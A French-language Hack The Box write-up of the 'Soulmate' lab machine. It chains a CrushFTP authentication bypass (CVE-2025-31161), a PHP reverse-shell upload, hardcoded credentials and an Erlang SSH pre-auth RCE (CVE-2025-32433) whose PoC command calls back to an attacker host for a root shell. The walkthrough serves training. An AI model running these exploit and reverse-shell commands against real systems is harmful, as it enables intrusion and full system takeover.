---
date: 2026-02-14T09:32:45-06:00
# description: ""
image: "/images/HTB-Soulmate/Soulmate.png"
showTableOfContents: true
tags: ["HackTheBox", "CVE-2025-31161", "CVE-2025-32433", "CrushFTP", "Erlang"]
categories: ["Writeups"]
title: "HTB: Soulmate"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Soulmate](https://app.hackthebox.com/machines/Soulmate)
* Niveau: Facile
* OS: Linux
---

Soulmate présente une instance de `CrushFTP` découverte grâce à l’énumération des sous-domaines. La recherche de vulnérabilités permet d’identifier le `CVE-2025-31161`, qui est exploité afin de compromettre l’application de transfert de fichiers. En abusant d’une fonctionnalité de téléversement, nous obtenons un premier accès au système cible.

Après compromission, l’énumération du système révèle un script contenant des identifiants utilisateurs valides, ce qui nous permet de pivoter vers un autre compte. Une analyse plus approfondie met ensuite en évidence un service interne `Erlang SSH` vulnérable au `CVE-2025-32433`, lequel est exploité afin d’obtenir un accès avec les privilèges root.

Ce write-up présente également un chemin d’exploitation alternatif, plus court, et explique pourquoi une élévation directe de privilèges est possible dans ce scénario.

# Balayage

```
nmap -p- --min-rate 1000 -T4 --open -n -Pn -sC -sV -oA nmap/Soulmate {IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 08:37 CST
Nmap scan report for 10.129.119.39
Host is up (0.10s latency).
Not shown: 51979 closed tcp ports (conn-refused), 13554 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.47 seconds
```

Nmap trouve deux ports ouverts avec SSH (22) et http (80). De plus, nous avons une redirection vers `http://soulmate.htb/`.

```
sudo echo "{IP} soulmate.htb" | sudo tee -a /etc/hosts
```
# Enumération

Sur `http://soulmate.htb/`, nous trouvons un site de rencontre.

![Soulmate website](/images/HTB-Soulmate/soulmate_website.png)

Nous créons un compte et nous nous connectons. Sur `http://soulmate.htb/profile.php`, nous disposons d'une fonctionnalité de téléversement qui pourrait potentiellement être exploitable.

![upload picture feature](/images/HTB-Soulmate/soulmate_website.png)

Le brute-forcing des répertoires est infructueux. Nous ne trouvons que le répertoire « assets » auquel nous ne pouvons pas accéder.
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb
```

![Soulmate directory brute forcing](/images/HTB-Soulmate/sm_gobuster.png)

![Soulmate asset directory no access](/images/HTB-Soulmate/sm_asset_noaccess.png)

Avec ffuf, nous trouvons un sous-domaine `ftp`.
```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -ic -fs 154
```

![Soulmate subdomain enumeration](/images/HTB-Soulmate/sm_ffuf.png)

En visitant `http://ftp.soulmate.htb`, nous découvrons une instance [CrushFTP](https://www.crushftp.com/index.html).

![Soulmate CrushFTP](/images/HTB-Soulmate/sm_CrushFTP.png)

En recherchant des vulnérabilités, nous trouvons [CVE-2025-31161](https://projectdiscovery.io/blog/crushftp-authentication-bypass) avec un PoC disponible [ici](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

> Cette vulnérabilité était initialement référencée sous le nom `CVE-2025-2825`, mais ce nom a été rejeté par le NIST et son numéro officiel est devenu `CVE-2025-31161`.

# Accès Initial

En exploitant cette vulnérabilité, nous pouvons créer un nouvel utilisateur doté de privilèges d'administrateur.

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb  --port 80 --target_user root --new_user kscorpio --password kscorpio
```

![CrushFTP auth bypass exploit](/images/HTB-Soulmate/sm_auth_exploit.png)

Nous nous connectons ensuite avec les identifiants créés.

![CrushFTP dashboard](/images/HTB-Soulmate/sm_admin.png)

Nous cliquons sur le menu hamburger dans le coin supérieur gauche, puis sur `Admin`.

![CrushFTP admin dashboard ](/images/HTB-Soulmate/crushftp_admin.png)

Sur la nouvelle page, nous sélectionnons à nouveau l'icône du menu hamburger, puis `User Manager`.

![CrushFTP user manager](/images/HTB-Soulmate/crushftp_usermanager.png)

Nous disposons de la liste de tous les utilisateurs et pouvons mettre à jour leur mot de passe grâce à nos privilèges d'administrateur.

> J'ai modifié le mot de passe de Ben. N'oubliez pas de cliquer sur `Save` pour confirmer la modification du mot de passe.

![CrushFTP password update](/images/HTB-Soulmate/crushftp_pwd_update.png)

Nous nous connectons en tant que `ben` et trouvons trois dossiers. Le dossier `webProd` contient tous les fichiers du site web.

![CrushFTP ben dashboard](/images/HTB-Soulmate/crushftp_ben.png)

Après l'avoir sélectionnée, l'option `Add files` devient disponible.

![CrushFTP Add files options](/images/HTB-Soulmate/crushftp_addfiles.png)

J'ai téléchargé le shell web disponible à l'adresse `/usr/share/webshells/php/php-reverse-shell.php` dans Kali Linux.

![CrushFTP reverse shell uploaded](/images/HTB-Soulmate/revshell_up_crushftp.png)

Visiter `http://soulmate.htb/rev.php` déclenche le revers shell et nous obtenons un shell en tant que `www-data`.

![Soulmate foothold](/images/HTB-Soulmate/sm_foothold.png)

Notre shell peut être amélioré à l'aide des commandes suivantes
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

# Elévation de Privilèges

Pour l'énumération du système, exécutons [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

Nous trouvons quelques scripts Erlang que nous devrions examiner.

![Soulmate escript files](/images/HTB-Soulmate/sm_escript_files.png)

Le fichier `start.escript` est un mini lanceur de serveur SSH écrit en Erlang. Il démarre un daemon SSH lié à l'hôte local sur le port 2222. Il enregistre également les tentatives d'authentification et contient des informations d'identification codées en dur.

![Soulmate ben SSH credentials](/images/HTB-Soulmate/ben_SSH_creds.png)

Le fichier `login.escript` est un script d'audit des connexions SSH. Il enregistre les métadonnées des sessions SSH, écrit les journaux dans `syslog` via `logger` et dans `/var/log/erlang_login/session.log`.

> [logger](https://ioflood.com/blog/logger-linux-command/) est un outil en ligne de commande permettant d'écrire des messages dans le journal système.

Nous utilisons ces identifiants pour nous connecter via SSH en tant que `ben`, le mot de passe est `HouseH0ldings998`.

```
ssh ben@soulmate.htb
```

![Soulmate user flag](/images/HTB-Soulmate/sm_user.png)

Le résultat de l'exécution de linPEAS affiche également les ports internes.

![Soulmate active ports](/images/HTB-Soulmate/sm_active_ports.png)

Le script mentionnait un serveur SSH sur le port `2222`, vérifions cela. `netcat` est déjà installé sur la cible, nous pouvons donc essayer de récupérer la bannière SSH localement.

```
nc 127.0.0.1 2222
```

![Erlang SSH banner](/images/HTB-Soulmate/sm_erlang_SSH.png)

Une simple recherche Google avec `SSH-2.0-Erlang/5.2.9 vulnerability` nous mène au [CVE-2025-32433](https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-) avec un PoC [ici](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC).

```
python3 cve-2025-32433.py 127.0.0.1 -p 2222 --lhost <ATTACKER_IP> --lport <ATTACKER_PORT> --shell
```

![CVE-2025-32433 PoC](/images/HTB-Soulmate/sm_privesc.png)

Sur le listener, nous obtenons un shell root.

![Soulmate root shell](/images/HTB-Soulmate/sm_root.png)

## Chemin plus court vers root

Nous pouvons passer directement du shell `www-data` à `root` en utilisant le même PoC.

![www-data Erlang-SSH exploit](/images/HTB-Soulmate/wwwdata_to_root.png)

Sur l'écouteur, nous obtenons un shell root sans avoir à compromettre  le compte `ben`.

![root shell from www-data](/images/HTB-Soulmate/wwwdata_to_root2.png)

Ce chemin d'attaque plus court est possible car `CVE-2025-32433` est une vulnérabilité RCE pré-authentification dans le daemon SSH Erlang. Cela signifie que tout utilisateur local capable d'atteindre le daemon SSH peut l'exploiter (même sans identifiants valides).

L'exploit donne un shell root parce que le daemon s'exécute en tant que root en arrière-plan. Nous pouvons le vérifier en exécutant quelques commandes.

En exécutant `ss -lntp` en tant que `root`, nous voyons que le port 2222 appartient à `beam.smp` avec le PID `1144`.

![Soulmate network info](/images/HTB-Soulmate/beam_PID.png)

Vérifions maintenant qui est le propriétaire de ce processus.
```
ps -p 1144 -o user,uid,cmd
```

![PID owner](/images/HTB-Soulmate/PID_owner.png)

Le résultat de la commande confirme que le daemon s'exécute en tant que root.
* L'utilisateur est `root`
* L'UID est `0`
* Il exécute `/usr/local/lib/erlang_login/start.escript

> Cette courte chaîne d'exploitation ne fonctionnerait pas si la machine avait été mise à jour avec une version patchée d'Erlang ou si le daemon avait été exécuté sous un utilisateur à faible privilège.

Cela nous rappelle que les services locaux peuvent également être exploités par des acteurs malveillants une fois qu'ils ont accès à un système, et que les daemons vulnérables appartenant à root constituent un moyen direct pour compromettre entièrement un système.





































